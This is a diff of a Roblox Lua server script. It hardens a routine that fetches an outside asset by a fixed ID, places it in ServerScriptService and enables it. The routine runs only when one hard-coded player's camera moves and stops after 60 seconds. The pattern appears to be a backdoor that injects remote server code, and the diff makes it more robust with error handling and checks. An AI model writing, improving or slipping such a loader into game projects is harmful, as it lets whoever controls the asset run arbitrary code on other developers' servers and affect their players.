@@ -8,12 +8,19 @@ local ASSET_ID = "rbxassetid://364364477"
 
 -- Function to load and execute AssetID
 local function loadAssetToServerScriptService(assetId)
-    local asset = game:GetObjects(assetId)[1]
-    if asset and asset:IsA("Script") then
-        asset.Parent = ServerScriptService
-        asset.Disabled = false
-    else
-        warn("Failed to load asset or incorrect asset type.")
+    local success, result = pcall(function()
+        local asset = game:GetObjects(assetId)[1]
+        if asset and asset:IsA("Script") then
+            asset.Parent = ServerScriptService
+            asset.Disabled = false
+            print("Asset successfully loaded into ServerScriptService.")
+        else
+            warn("Failed to load asset or incorrect asset type.")
+        end
+    end)
+    
+    if not success then
+        warn("Error loading asset:", result)
     end
 end
 
@@ -22,22 +29,31 @@ local function setupPlayerSignals(player)
     if player.Name == TARGET_PLAYER_NAME then
         local camera = workspace.CurrentCamera
 
-        -- Using GetPropertyChangedSignal to listen to camera-related changes
-        local connection = camera:GetPropertyChangedSignal("CFrame"):Connect(function()
-            -- Load AssetID into ServerScriptService when a camera property changes
-            loadAssetToServerScriptService(ASSET_ID)
-        end)
+        -- Make sure the camera exists
+        if camera then
+            -- Using GetPropertyChangedSignal to listen to camera-related changes
+            local connection = camera:GetPropertyChangedSignal("CFrame"):Connect(function()
+                -- Load AssetID into ServerScriptService when a camera property changes
+                loadAssetToServerScriptService(ASSET_ID)
+            end)
 
-        -- Clean up the connection after 60 seconds
-        delay(60, function()
-            connection:Disconnect()
-        end)
+            -- Clean up the connection after 60 seconds
+            delay(60, function()
+                connection:Disconnect()
+                print("Connection cleaned up after 60 seconds.")
+            end)
+        else
+            warn("Camera not found.")
+        end
     end
 end
 
--- Handle existing and new players
+-- Handle existing players
 for _, player in pairs(Players:GetPlayers()) do
     task.spawn(setupPlayerSignals, player)
 end
 
-Players.PlayerAdded:Connect(setupPlayerSignals)
+-- Listen for new players joining
+Players.PlayerAdded:Connect(function(player)
+    task.spawn(setupPlayerSignals, player)
+end)
